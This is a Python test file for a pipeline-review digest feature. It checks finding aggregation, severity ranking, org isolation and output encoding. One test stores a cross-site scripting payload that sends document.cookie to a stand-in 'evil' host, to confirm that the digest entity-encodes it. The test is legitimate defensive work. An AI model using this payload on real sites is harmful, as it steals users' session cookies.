"""UNFILED-REVIEW — ``craw code review``: ledger/observer/DLQ → ranked authoring digest.

Pins: the digest aggregates observer events + run-info + DLQ over ``--since``; each finding carries
a deterministic ``suggested_action`` for its static ``kind``; findings rank by severity then
recency; ``detail`` is output-encoded (an injected ``<script>`` renders inert in the digest); and
the read is org-isolated. Read-only + scrubbed — no run is triggered, no DLQ entry is drained.

Deterministic: a temp project Store seeded with rows; no live model call.
"""

from __future__ import annotations

import time
from pathlib import Path

from crawfish.code.dashboard import build_data
from crawfish.code.review import build_digest
from crawfish.deploy import DeployEntry, DeployRegistry
from crawfish.manage import store_for_dir
from crawfish.observe import ObserverEvent, ObserverSurface, RunInfo, Severity


def _project(tmp_path: Path) -> Path:
    root = tmp_path / "app"
    (root / ".crawfish").mkdir(parents=True)
    return root


def _seed(root: Path, *, org: str = "local") -> None:
    """Seed a deployed pipeline, a cost spike, a quality flag, and 3 DLQ entries on one batch."""
    store = store_for_dir(str(root))
    try:
        DeployRegistry(store, org_id=org).register(
            DeployEntry(name="triage-bot", pid=0, dir=".", session="x/triage-bot")
        )
        surface = ObserverSurface(store, org_id=org)
        surface.emit(
            ObserverEvent(
                pipeline="triage-bot",
                kind="cost.spike",
                severity=Severity.WARN,
                detail="$2.10 in 5m",
                run_id="run-cost",
                ts=time.time() - 100,
            )
        )
        surface.emit(
            ObserverEvent(
                pipeline="triage-bot",
                kind="quality.flag",
                severity=Severity.WARN,
                detail="low score",
                run_id="run-q",
                ts=time.time() - 50,
            )
        )
        surface.put_run_info(RunInfo(pipeline="triage-bot", run_id="run-fail", status="failed"))
        for i in range(3):
            store.put_record(
                "dead_letter",
                f"run-fail:item-{i}",
                {
                    "batch_id": "run-fail",
                    "item_id": f"item-{i}",
                    "error": "schema mismatch",
                    "pipeline": "triage-bot",
                    "run_id": "run-fail",
                },
                org_id=org,
            )
    finally:
        store.close()


def test_digest_aggregates_and_suggests(tmp_path: Path) -> None:
    root = _project(tmp_path)
    _seed(root)
    data = build_data(root, org_id="local")
    try:
        findings = build_digest(data, since="-1d")
    finally:
        data._store.close()  # noqa: SLF001

    kinds = {f.kind for f in findings}
    assert kinds == {"cost.spike", "quality.flag", "failure.rate"}

    by_kind = {f.kind: f for f in findings}
    assert (
        by_kind["cost.spike"].suggested_action
        == "craw code optimize definitions/triage-bot --mode tune"
    )
    assert (
        by_kind["quality.flag"].suggested_action
        == "craw code optimize definitions/triage-bot --mode refine"
    )
    assert by_kind["failure.rate"].suggested_action == "craw code diagnose run-fail"
    assert by_kind["failure.rate"].dlq_count == 3


def test_findings_rank_critical_first(tmp_path: Path) -> None:
    root = _project(tmp_path)
    _seed(root)
    data = build_data(root, org_id="local")
    try:
        findings = build_digest(data, since="-1d")
    finally:
        data._store.close()  # noqa: SLF001
    # The DLQ failure.rate is critical → it must sort ahead of the two warn events.
    assert findings[0].kind == "failure.rate"
    assert findings[0].severity == "critical"


def test_injected_detail_is_encoded(tmp_path: Path) -> None:
    root = tmp_path / "x"
    (root / ".crawfish").mkdir(parents=True)
    store = store_for_dir(str(root))
    try:
        DeployRegistry(store, org_id="local").register(
            DeployEntry(name="triage-bot", pid=0, dir=".", session="x/triage-bot")
        )
        ObserverSurface(store, org_id="local").emit(
            ObserverEvent(
                pipeline="triage-bot",
                kind="quality.flag",
                detail="<script>fetch('http://evil/'+document.cookie)</script>",
                ts=time.time() - 10,
            )
        )
    finally:
        store.close()
    data = build_data(root, org_id="local")
    try:
        findings = build_digest(data, since="-1d")
    finally:
        data._store.close()  # noqa: SLF001
    (f,) = findings
    assert "<script>" not in f.detail  # the live tag is gone…
    assert "&lt;script&gt;" in f.detail  # …entity-encoded instead


def test_two_org_isolation(tmp_path: Path) -> None:
    root = _project(tmp_path)
    _seed(root, org="a")
    data = build_data(root, org_id="b")  # a different org sees none of org a's rows
    try:
        findings = build_digest(data, since="-1d")
    finally:
        data._store.close()  # noqa: SLF001
    assert findings == []
